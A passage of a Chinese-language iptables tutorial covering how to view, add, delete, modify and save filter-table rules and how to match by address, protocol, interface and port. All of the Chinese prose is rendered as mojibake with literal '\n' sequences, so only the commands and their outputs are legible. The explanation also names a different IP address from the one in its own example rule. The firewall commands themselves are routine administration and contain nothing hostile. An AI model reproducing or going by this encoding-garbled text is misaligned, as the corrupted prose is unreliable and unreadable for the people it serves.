filterè¿‡æ»¤è§„åˆ™\n\nfilterè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œæ¯”å¦‚å…è®¸å“ªäº›IPåœ°å€è®¿é—®ï¼Œæ‹’ç»å“ªäº›IPåœ°å€è®¿é—®ï¼Œå…è®¸è®¿é—®å“ªäº›ç«¯å£ï¼Œç¦æ­¢è®¿é—®å“ªäº›ç«¯å£ï¼Œfilterè¡¨ä¼šæ ¹æ®æˆ‘ä»¬å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œfilterè¡¨åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„è¡¨äº†ã€‚\n\n### 3.1 æŸ¥çœ‹è§„åˆ™\n\næ€æ ·æŸ¥çœ‹filterè¡¨ä¸­çš„è§„åˆ™å‘¢ï¼Ÿä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯æŸ¥çœ‹ã€‚\n\n```bash\niptables -t filter -L\n```\n\nåˆšæ‰æåˆ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨iptables -t filter -Lå‘½ä»¤åˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œé‚£ä¹ˆä¸¾ä¸€åä¸‰ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŸ¥çœ‹å…¶å®ƒè¡¨ä¸­çš„è§„åˆ™ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\niptables -t raw -L\niptables -t mangle -L\niptables -t nat -L\n```\n\nå…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥-t filterï¼Œå½“æ²¡æœ‰ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ï¼Œå³iptables -Lè¡¨ç¤ºåˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ã€‚\n\n\n\n### 3.2 è¯¦ç»†ä¿¡æ¯\n\næˆ‘ä»¬è¿˜å¯ä»¥åªæŸ¥çœ‹æŒ‡å®šè¡¨ä¸­çš„æŒ‡å®šé“¾çš„è§„åˆ™ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬åªæŸ¥çœ‹filterè¡¨ä¸­INPUTé“¾çš„è§„åˆ™ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼ˆæ³¨æ„å¤§å°å†™ï¼‰ã€‚\n\n```bash\n# iptables --line-numbers  -nvL INPUT\nChain INPUT (policy ACCEPT 14M packets, 2062M bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\n1    2697K  114M KUBE-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes service portals */\n2    2697K  114M KUBE-EXTERNAL-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes externally-visible service portals */\n3     906M  477G KUBE-FIREWALL  all  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\n+ å¤´å«ä¹‰\n\n  ä¸Šå›¾ä¸­INPUTé“¾åé¢çš„æ‹¬å·ä¸­åŒ…å«policy ACCEPT ï¼Œ0 packetsï¼Œ0bytes ä¸‰éƒ¨åˆ†ã€‚\n\n  ```ini\n  policy:è¡¨ç¤ºå½“å‰é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œpolicy ACCEPTè¡¨ç¤ºä¸Šå›¾ä¸­INPUTçš„é“¾çš„é»˜è®¤åŠ¨ä½œä¸ºACCEPT\n  packets:è¡¨ç¤ºå½“å‰é“¾ï¼ˆä¸Šä¾‹ä¸ºINPUTé“¾ï¼‰é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„åŒ…çš„æ•°é‡ï¼Œ0 packetsè¡¨ç¤ºé»˜è®¤ç­–ç•¥åŒ¹é…åˆ°0ä¸ªåŒ…ã€‚\n  bytes:è¡¨ç¤ºå½“å‰é“¾é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æ‰€æœ‰åŒ…çš„å¤§å°æ€»å’Œã€‚\n  ```\n\n  å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpacketsä¸bytesç§°ä½œ\"è®¡æ•°å™¨\"ï¼Œä¸Šå›¾ä¸­çš„è®¡æ•°å™¨è®°å½•äº†é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æŠ¥æ–‡æ•°é‡ä¸æ€»å¤§å°ï¼Œ\"è®¡æ•°å™¨\"åªä¼šåœ¨ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚\n\n  \n\n+ å­—æ®µå«ä¹‰\n\n  ```ini\n  pkts:å¯¹åº”è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ä¸ªæ•°ã€‚\n  bytes:å¯¹åº”åŒ¹é…åˆ°çš„æŠ¥æ–‡åŒ…çš„å¤§å°æ€»å’Œã€‚\n  target:è§„åˆ™å¯¹åº”çš„targetï¼Œå¾€å¾€è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„\"åŠ¨ä½œ\"ï¼Œå³è§„åˆ™åŒ¹é…æˆåŠŸåéœ€è¦é‡‡å–çš„æªæ–½ã€‚\n  prot:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„åè®®ï¼Œæ˜¯å¦åªé’ˆå¯¹æŸäº›åè®®åº”ç”¨æ­¤è§„åˆ™ã€‚\n  opt:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„é€‰é¡¹ã€‚\n  in:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå…¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå…¥çš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚\n  out:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå‡ºçš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚\n  source:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„æºå¤´åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚\n  destination:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚\n  ```\n\n  \n\n### 3.3 å¢åŠ è§„åˆ™\n\nä¸ºäº†å‡†å¤‡ä¸€ä¸ªä»é›¶å¼€å§‹çš„ç¯å¢ƒï¼Œä½¿ç”¨`iptables -F INPUT`å‘½ä»¤æ¸…ç©ºfilterè¡¨INPUTé“¾ä¸­çš„è§„åˆ™ã€‚\n\n```bash\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 215 packets, 16538 bytes)\n pkts bytes target     prot opt in     out     source               destination\n```\n\næ¸…ç©ºINPUTé“¾ä»¥åï¼Œfilterè¡¨ä¸­çš„INPUTé“¾å·²ç»ä¸å­˜åœ¨ä»»ä½•çš„è§„åˆ™ï¼Œä½†æ˜¯å¯ä»¥çœ‹å‡ºï¼ŒINPUTé“¾çš„é»˜è®¤ç­–ç•¥æ˜¯ACCEPTï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒINPUTé“¾é»˜è®¤\"æ”¾è¡Œ\"æ‰€æœ‰å‘å¾€æœ¬æœºçš„æŠ¥æ–‡ï¼Œå½“æ²¡æœ‰ä»»ä½•è§„åˆ™æ—¶ï¼Œä¼šæ¥å—æ‰€æœ‰æŠ¥æ–‡ï¼Œå½“æŠ¥æ–‡æ²¡æœ‰è¢«ä»»ä½•è§„åˆ™åŒ¹é…åˆ°æ—¶ï¼Œä¹Ÿä¼šé»˜è®¤æ”¾è¡ŒæŠ¥æ–‡ã€‚\n\n\n\n+ å¢åŠ \n\n```bash\niptables -t filter -I INPUT -s 123.117.179.97 -j DROP\n```\n\nåœ¨ç›®æ ‡æœåŠ¡å™¨å¢åŠ ä¸€æ¡æœ¬åœ°çš„ ip, å‘ç°å·²ç» pingä¸é€šäº†.\n\nä¸Šå›¾ä¸­ï¼Œä½¿ç”¨ -té€‰é¡¹æŒ‡å®šäº†è¦æ“ä½œçš„è¡¨ï¼Œæ­¤å¤„æŒ‡å®šäº†æ“ä½œfilterè¡¨ï¼Œä¸ä¹‹å‰çš„æŸ¥çœ‹å‘½ä»¤ä¸€æ ·ï¼Œä¸ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ã€‚\nä½¿ç”¨-Ié€‰é¡¹ï¼ŒæŒ‡æ˜å°†\"è§„åˆ™\"æ’å…¥è‡³å“ªä¸ªé“¾ä¸­ï¼Œ-Iè¡¨ç¤ºinsertï¼Œå³æ’å…¥çš„æ„æ€ï¼Œæ‰€ä»¥-I INPUTè¡¨ç¤ºå°†è§„åˆ™æ’å…¥äºINPUTé“¾ä¸­ï¼Œå³æ·»åŠ è§„åˆ™ä¹‹æ„ã€‚\n\nä½¿ç”¨-sé€‰é¡¹ï¼ŒæŒ‡æ˜\"åŒ¹é…æ¡ä»¶\"ä¸­çš„\"æºåœ°å€\"ï¼Œå³å¦‚æœæŠ¥æ–‡çš„æºåœ°å€å±äº-så¯¹åº”çš„åœ°å€ï¼Œé‚£ä¹ˆæŠ¥æ–‡åˆ™æ»¡è¶³åŒ¹é…æ¡ä»¶ï¼Œ-sä¸ºsourceä¹‹æ„ï¼Œè¡¨ç¤ºæºåœ°å€ã€‚\n\nä½¿ç”¨-jé€‰é¡¹ï¼ŒæŒ‡æ˜å½“\"åŒ¹é…æ¡ä»¶\"è¢«æ»¡è¶³æ—¶ï¼Œæ‰€å¯¹åº”çš„åŠ¨ä½œï¼Œä¸Šä¾‹ä¸­æŒ‡å®šçš„åŠ¨ä½œä¸ºDROPï¼Œåœ¨ä¸Šä¾‹ä¸­ï¼Œå½“æŠ¥æ–‡çš„æºåœ°å€ä¸º223.70.253.1æ—¶ï¼ŒæŠ¥æ–‡åˆ™è¢«DROPï¼ˆä¸¢å¼ƒï¼‰ã€‚\n\n\n\n+ æŸ¥çœ‹\n\nå†æ¬¡æŸ¥çœ‹filterè¡¨ä¸­çš„INPUTé“¾ï¼Œå‘ç°è§„åˆ™å·²ç»è¢«æ·»åŠ äº†ï¼Œåœ¨iptablesä¸­ï¼ŒåŠ¨ä½œè¢«ç§°ä¹‹ä¸º\"target\"ï¼Œæ‰€ä»¥ï¼Œä¸Šå›¾ä¸­tagetå­—æ®µå¯¹åº”çš„åŠ¨ä½œä¸ºDROPã€‚\n\n```bash\nroot@tencent:~# iptables -vL INPUT\nChain INPUT (policy ACCEPT 2043 packets, 135K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n   66  9796 DROP       all  --  any    any     123.117.179.97       anywhere  \n```\n\næ³¨æ„çœ‹, å¯ä»¥çœ‹åˆ° bytes çš„å­—èŠ‚æ•°, è¯´æ˜å·²ç»åŒ¹é…ä¸Šäº†.\n\n\n\n+ é¡ºåº\n\nè§„åˆ™çš„é¡ºåºå¾ˆé‡è¦ã€‚\n\nå¦‚æœæŠ¥æ–‡å·²ç»è¢«å‰é¢çš„è§„åˆ™åŒ¹é…åˆ°ï¼Œiptablesåˆ™ä¼šå¯¹æŠ¥æ–‡æ‰§è¡Œå¯¹åº”çš„åŠ¨ä½œï¼Œå³ä½¿åé¢çš„è§„åˆ™ä¹Ÿèƒ½åŒ¹é…åˆ°å½“å‰æŠ¥æ–‡ï¼Œå¾ˆæœ‰å¯èƒ½ä¹Ÿæ²¡æœ‰æœºä¼šå†å¯¹æŠ¥æ–‡æ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚\n\n\n\n### 3.4 åˆ é™¤è§„åˆ™\n\næ­¤åˆ»ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ é™¤filterè¡¨ä¸­INPUTä¸­çš„ä¸€æ¡è§„åˆ™ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿæœ‰ä¸¤ç§åŠæ³•\næ–¹æ³•ä¸€ï¼šæ ¹æ®è§„åˆ™çš„ç¼–å·å»åˆ é™¤è§„åˆ™\næ–¹æ³•äºŒï¼šæ ¹æ®å…·ä½“çš„åŒ¹é…æ¡ä»¶ä¸åŠ¨ä½œåˆ é™¤è§„åˆ™\n\n```bash\n# æ·»åŠ ä¸¤ç§\niptables -t filter -A INPUT -s 1.1.1.1 -j DROP\niptables -t filter -A INPUT -s 1.1.1.2 -j DROP\n\n\niptables --line -nvL INPUT\n3        0     0 DROP       all  --  *      *       1.1.1.1              0.0.0.0/0           \n4        0     0 DROP       all  --  *      *       1.1.1.2              0.0.0.0/0  \n\n\n# ä¸¤ç§åˆ é™¤æ–¹å¼\niptables -D INPUT 3\niptables -D INPUT -s 1.1.1.2 -j DROP\n```\n\n\n\n+ åˆ é™¤æ‰€æœ‰\n\n  è€Œåˆ é™¤æŒ‡å®šè¡¨ä¸­æŸæ¡é“¾ä¸­çš„æ‰€æœ‰è§„åˆ™çš„å‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨ä¸€å¼€å§‹å°±ä½¿ç”¨åˆ°äº†ï¼Œå°±æ˜¯\"iptables -t è¡¨å -F é“¾å\"\n  -Fé€‰é¡¹ä¸ºflushä¹‹æ„ï¼Œå³å†²åˆ·æŒ‡å®šçš„é“¾ï¼Œå³åˆ é™¤æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œä½†æ˜¯æ³¨æ„ï¼Œæ­¤æ“ä½œç›¸å½“äºåˆ é™¤æ“ä½œï¼Œåœ¨æ²¡æœ‰ä¿å­˜iptablesè§„åˆ™çš„æƒ…å†µä¸‹ï¼Œè¯·æ…ç”¨ã€‚\n\n\n\n### 3.5 ä¿®æ”¹è§„åˆ™\n\nå»ºè®®åˆ é™¤åå†æ–°å¢\n\n+ ä¿®æ”¹é»˜è®¤ç­–ç•¥\n  ä½¿ç”¨-tæŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œä½¿ç”¨-Pé€‰é¡¹æŒ‡å®šè¦ä¿®æ”¹çš„é“¾ï¼Œä¸‹ä¾‹ä¸­ï¼Œ`-P FORWARD ACCEPT`è¡¨ç¤ºå°†è¡¨ä¸­FORWRDé“¾çš„é»˜è®¤ç­–ç•¥æ”¹ä¸ºACCEPTã€‚\n\n  ```bash\n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy DROP 0 packets, 0 bytes)\n  \n  # æ‰§è¡Œä¿®æ”¹é»˜è®¤\n  iptables -P FORWARD ACCEPT\n  \n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n  ```\n\n  \n\n### 3.6 ä¿å­˜è§„åˆ™\n\nåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯¹\"é˜²ç«å¢™\"æ‰€åšå‡ºçš„ä¿®æ”¹éƒ½æ˜¯\"ä¸´æ—¶çš„\"ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼Œå½“é‡å¯iptablesæœåŠ¡æˆ–è€…é‡å¯æœåŠ¡å™¨ä»¥åï¼Œæˆ‘ä»¬å¹³å¸¸æ·»åŠ çš„è§„åˆ™æˆ–è€…å¯¹è§„åˆ™æ‰€åšå‡ºçš„ä¿®æ”¹éƒ½å°†æ¶ˆå¤±ï¼Œä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œæˆ‘ä»¬éœ€è¦å°†è§„åˆ™\"ä¿å­˜\"ã€‚\n\n+ centos\n\n  centos6ä¸­ï¼Œä½¿ç”¨\"service iptables save\"å‘½ä»¤å³å¯ä¿å­˜è§„åˆ™ï¼Œè§„åˆ™é»˜è®¤ä¿å­˜åœ¨/etc/sysconfig/iptablesæ–‡ä»¶ä¸­\n\n  ```bash\n  service iptables save\n  ```\n\n  centos7ä¸­ï¼Œä½¿ç”¨firewallæ›¿ä»£äº†åŸæ¥çš„iptables service\n\n  ```bash\n  firewall-cmd --zone=public --add-port=3000/tcp --permanent\n  firewall-cmd --reload\n  \n  # ä¹Ÿå¯ä»¥å®‰è£… iptables-service\n  yum install -y iptables-services\n  systemctl disable firewalld\n  systemctl enable iptables\n  service iptables save\n  ```\n\n  è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ä¿å­˜iptablesè§„åˆ™ï¼Œå°±æ˜¯ä½¿ç”¨iptables-saveå‘½ä»¤\n  ä½¿ç”¨iptables-saveå¹¶ä¸èƒ½ä¿å­˜å½“å‰çš„iptablesè§„åˆ™ï¼Œä½†æ˜¯å¯ä»¥å°†å½“å‰çš„iptablesè§„åˆ™ä»¥\"ä¿å­˜åçš„æ ¼å¼\"è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚å¯ä»¥ä½¿ç”¨iptables-saveå‘½ä»¤ï¼Œå†é…åˆé‡å®šå‘\n\n  ```bash\n  iptables-save > /etc/sysconfig/iptables\n  iptables-restore < /etc/sysconfig/iptables\n  ```\n\n+ ubuntu\n\n  ```bash\n  sudo apt-get install iptables-persistent\n  \n  sudo /etc/init.d/iptables-persistent save \n  sudo /etc/init.d/iptables-persistent reload\n  \n  # Ubuntu 16.04 Server\n  sudo netfilter-persistent save\n  sudo netfilter-persistent reload\n  ```\n\n\n\n# 4. åŒ¹é…æ¡ä»¶\n\n### 4.1 åŒ¹é…æ–¹å¼\n\n```bash\n# å•ä¸ªåŒ¹é…\niptables -I INPUT -s 1.1.1.2 -j DROP\n\n# å¤šä¸ªåŒ¹é…\niptables -I INPUT -s 1.1.1.3,1.1.1.4 -j DROP\n\n# ç½‘æ®µåŒ¹é…\niptables -I INPUT -s 1.1.1.5/23 -j DROP\n\n# å–ååŒ¹é…\niptables -I INPUT ! -s 1.1.1.6 -j ACCEPT\n```\n\n\n\n+ å–åæ³¨æ„ç‚¹\n\nä½¿ç”¨ \"!\" å–åååˆ™è¡¨ç¤ºï¼ŒæŠ¥æ–‡æºåœ°å€IPåªè¦ä¸ä¸º1.1.1.6å³æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆï¼Œä¸Šä¾‹ä¸­è§„åˆ™è¡¨è¾¾çš„æ„æ€å°±æ˜¯ï¼Œåªè¦å‘å¾€æœ¬æœºçš„æŠ¥æ–‡çš„æºåœ°å€ä¸æ˜¯1.1.1.6ï¼Œå°±æ¥å—æŠ¥æ–‡ã€‚\n\nåªè¦æŠ¥æ–‡çš„æºIPä¸æ˜¯1.1.1.6ï¼Œé‚£ä¹ˆå°±æ¥å—æ­¤æŠ¥æ–‡ï¼Œä½†æ˜¯ï¼ŒæŸäº›å°ä¼™ä¼´å¯èƒ½ä¼šè¯¯ä¼šï¼ŒæŠŠä¸Šä¾‹ä¸­çš„è§„åˆ™ç†è§£æˆå¦‚ä¸‹å«ä¹‰ï¼Œ\n\nåªè¦æŠ¥æ–‡çš„æºIPæ˜¯1.1.1.6ï¼Œé‚£ä¹ˆå°±ä¸æ¥å—æ­¤æŠ¥æ–‡ï¼Œè¿™ç§ç†è§£ä¸ä¸Šè¿°ç†è§£çœ‹ä¼¼å·®åˆ«ä¸å¤§ï¼Œå…¶å®å®Œå…¨ä¸ä¸€æ ·ï¼Œè¿™æ ·ç†è§£æ˜¯é”™è¯¯çš„ï¼Œä¸Šè¿°ç†è§£æ‰æ˜¯æ­£ç¡®çš„ã€‚\n\n> æ¢å¥è¯è¯´å°±æ˜¯ï¼ŒæŠ¥æ–‡çš„æºIPä¸æ˜¯1.1.1.6æ—¶ï¼Œä¼šè¢«æ¥æ”¶ï¼Œå¹¶ä¸èƒ½ä»£è¡¨ï¼ŒæŠ¥æ–‡çš„æºIPæ˜¯1.1.1.6æ—¶ï¼Œä¼šè¢«æ‹’ç»ã€‚\n\n\n\n### 4.2 åŒ¹é…IPåœ°å€\n\n```bash\n# åªä¸¢å¼ƒä» 1.1.1.7 å‘å¾€ 1.1.1.8 è¿™ä¸ªIPçš„æŠ¥æ–‡\niptables -I INPUT -s 1.1.1.7 -d 1.1.1.8 -j DROP\n```\n\nå¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šä»»ä½•ç›®æ ‡åœ°å€ï¼Œåˆ™ç›®æ ‡åœ°å€é»˜è®¤ä¸º0.0.0.0/0ï¼ŒåŒç†ï¼Œå¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šæºåœ°å€ï¼Œæºåœ°å€é»˜è®¤ä¸º0.0.0.0/0ï¼Œ0.0.0.0/0è¡¨ç¤ºæ‰€æœ‰IPï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\nä¸-sé€‰é¡¹ä¸€æ ·ï¼Œ-dé€‰é¡¹ä¹Ÿå¯ä»¥ä½¿ç”¨\"å¹å·\"è¿›è¡Œå–åï¼Œä¹Ÿèƒ½å¤ŸåŒæ—¶æŒ‡å®šå¤šä¸ªIPåœ°å€ï¼Œä½¿ç”¨\"é€—å·\"éš”å¼€å³å¯ã€‚\n\nä½†æ˜¯è¯·æ³¨æ„ï¼Œä¸ç®¡æ˜¯-sé€‰é¡¹è¿˜æ˜¯-dé€‰é¡¹ï¼Œå–åæ“ä½œä¸åŒæ—¶æŒ‡å®šå¤šä¸ªIPçš„æ“ä½œä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚\n\n\n\n> éœ€è¦æ˜ç¡®çš„ä¸€ç‚¹å°±æ˜¯ï¼šå½“ä¸€æ¡è§„åˆ™ä¸­æœ‰å¤šä¸ªåŒ¹é…æ¡ä»¶æ—¶ï¼Œè¿™å¤šä¸ªåŒ¹é…æ¡ä»¶ä¹‹é—´ï¼Œé»˜è®¤å­˜åœ¨\"ä¸\"çš„å…³ç³»ã€‚ä¹Ÿå°±æ˜¯å–å…¶äº¤é›†çš„æ„æ€ã€‚\n\n\n\n### 4.3 åŒ¹é…åè®®ç±»å‹\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨-pé€‰é¡¹ï¼ŒæŒ‡å®šéœ€è¦åŒ¹é…çš„æŠ¥æ–‡çš„åè®®ç±»å‹ã€‚\n\næ‹’ç»æ¥è‡ª `1.1.1.2`çš„tcpç±»å‹çš„è¯·æ±‚\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -j DROP\n\n\nroot@tencent:~# iptables -L INPUT\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\nDROP       tcp  --  1.1.1.2              anywhere\n```\n\n\n\ncentos6ä¸­ï¼Œ-pé€‰é¡¹æ”¯æŒå¦‚ä¸‹åè®®ç±»å‹\n\n```bash\ntcp, udp, udplite, icmp, esp, ah, sctp\n```\n\ncentos7ä¸­ï¼Œ-pé€‰é¡¹æ”¯æŒå¦‚ä¸‹åè®®ç±»å‹\n\n```bash\ntcp, udp, udplite, icmp, icmpv6,esp, ah, sctp, mh\n```\n\nå½“ä¸ä½¿ç”¨-pæŒ‡å®šåè®®ç±»å‹æ—¶ï¼Œé»˜è®¤è¡¨ç¤ºæ‰€æœ‰ç±»å‹çš„åè®®éƒ½ä¼šè¢«åŒ¹é…åˆ°ï¼Œä¸ä½¿ç”¨-p allçš„æ•ˆæœç›¸åŒã€‚\n\n\n\n+ æµ‹è¯•\n\n  ```bash\n  ping 49.234.15.70 # æœåŠ¡å™¨å¯ä»¥é€š\n  \n  ps -ef | grep sshd #  è·å–ç™»å½•è€… root@pts/1\n  who -a | grep pts/0 # è·å–ç™»å½•è€…ip 20816 (223.70.253.1)\n  \n  iptables -I INPUT -s 223.70.253.1 -p icmp -j DROP # æœåŠ¡å™¨ç¦ping\n  \n  ping 49.234.15.70 # æœåŠ¡å™¨ä¸é€šäº†\n  ```\n\n\n\n### 4.4 åŒ¹é…ç½‘å¡æ¥å£\n\n+ å…¥å£\n\nä½¿ç”¨-ié€‰é¡¹ï¼ŒæŒ‡å®šç½‘å¡åç§°, è¡¨ç¤ºä¸¢å¼ƒç”±eth0ç½‘å¡æµå…¥çš„icmpç±»å‹çš„æŠ¥æ–‡ã€‚\n\n```bash\niptables -I INPUT -s 223.70.253.1 -i eth0 -p icmp -j DROP\n```\n\n\n\n-ié€‰é¡¹æ˜¯ç”¨äºåŒ¹é…æŠ¥æ–‡æµå…¥çš„ç½‘å¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»æœ¬æœºå‘å‡ºçš„æŠ¥æ–‡æ˜¯ä¸å¯èƒ½ä¼šä½¿ç”¨åˆ°-ié€‰é¡¹çš„ï¼Œå› ä¸ºè¿™äº›ç”±æœ¬æœºå‘å‡ºçš„æŠ¥æ–‡å‹æ ¹ä¸æ˜¯ä»ç½‘å¡æµå…¥çš„ï¼Œè€Œæ˜¯è¦é€šè¿‡ç½‘å¡å‘å‡ºçš„ï¼Œä»è¿™ä¸ªè§’åº¦è€ƒè™‘ï¼Œ-ié€‰é¡¹çš„ä½¿ç”¨æ˜¯æœ‰é™åˆ¶çš„ã€‚\n\næ‰€ä»¥-ié€‰é¡¹åªèƒ½ç”¨äºä¸Šå›¾ä¸­çš„PREROUTINGé“¾ã€INPUTé“¾ã€FORWARDé“¾ï¼Œè¿™æ˜¯-ié€‰é¡¹çš„ç‰¹æ®Šæ€§ã€‚\n\n\n\n+ å‡ºå£\n\nå½“ä¸»æœºæœ‰å¤šå—ç½‘å¡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨-oé€‰é¡¹ï¼ŒåŒ¹é…æŠ¥æ–‡å°†ç”±å“ªå—ç½‘å¡æµå‡ºï¼Œæ²¡é”™ï¼Œ-oé€‰é¡¹ä¸-ié€‰é¡¹æ˜¯ç›¸å¯¹çš„ï¼Œ-ié€‰é¡¹ç”¨äºåŒ¹é…æŠ¥æ–‡ä»å“ªä¸ªç½‘å¡æµå…¥ï¼Œ-oé€‰é¡¹ç”¨äºåŒ¹é…æŠ¥æ–‡å°†ä»å“ªä¸ªç½‘å¡æµå‡ºã€‚\n\n-oé€‰é¡¹åªèƒ½ç”¨äºFORWARDé“¾ã€OUTPUTé“¾ã€POSTROUTINGé“¾ã€‚\n\n\n\n### 4.5 åŒ¹é…ç«¯å£\n\nåŒ¹é…ç«¯å£å±äºæ‰©å±•åŒ¹é…æ¡ä»¶, éœ€è¦ä¾èµ–ä¸€äº›æ‰©å±•æ¨¡å—.\n\n##### 4.5.1 ç«¯å£ -m tcp\n\né€‰é¡¹--dportå¯ä»¥åŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ï¼Œ--dportæ„ä¸ºdestination-portï¼Œå³è¡¨ç¤ºç›®æ ‡ç«¯å£ã€‚ä¸ä¹‹å‰çš„é€‰é¡¹ä¸åŒï¼Œ--dportå‰æœ‰ä¸¤æ¡\"æ¨ªæ \"ï¼Œè€Œä¸”ï¼Œä½¿ç”¨--dporté€‰é¡¹æ—¶ï¼Œå¿…é¡»äº‹å…ˆæŒ‡å®šäº†ä½¿ç”¨å“ªç§åè®®ï¼Œå³å¿…é¡»å…ˆä½¿ç”¨-pé€‰é¡¹\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m tcp --dport 22 -j DROP\n\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 1631 packets, 1525K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            tcp dpt:22\n```\n\n\n\nåœ¨ä½¿ç”¨--dportä¹‹å‰ï¼Œæˆ‘ä»¬ä½¿ç”¨-mé€‰é¡¹ï¼ŒæŒ‡å®šäº†å¯¹åº”çš„æ‰©å±•æ¨¡å—ä¸ºtcpï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨--dportè¿™ä¸ªæ‰©å±•åŒ¹é…æ¡ä»¶ï¼Œåˆ™å¿…é¡»ä¾é æŸä¸ªæ‰©å±•æ¨¡å—å®Œæˆï¼Œä¸Šä¾‹ä¸­ï¼Œè¿™ä¸ªæ‰©å±•æ¨¡å—å°±æ˜¯tcpæ‰©å±•æ¨¡å—ï¼Œæœ€ç»ˆï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯tcpæ‰©å±•æ¨¡å—ä¸­çš„dportæ‰©å±•åŒ¹é…æ¡ä»¶ã€‚\n\n+ -m tcpè¡¨ç¤ºä½¿ç”¨tcpæ‰©å±•æ¨¡å—ï¼Œ--dportè¡¨ç¤ºtcpæ‰©å±•æ¨¡å—ä¸­çš„ä¸€ä¸ªæ‰©å±•åŒ¹é…æ¡ä»¶ï¼Œå¯ç”¨äºåŒ¹é…æŠ¥æ–‡çš„ç›®æ ‡ç«¯å£ã€‚\n+ -p tcpä¸ -m tcpå¹¶ä¸å†²çªï¼Œ-pç”¨äºåŒ¹é…æŠ¥æ–‡çš„åè®®ï¼Œ-m 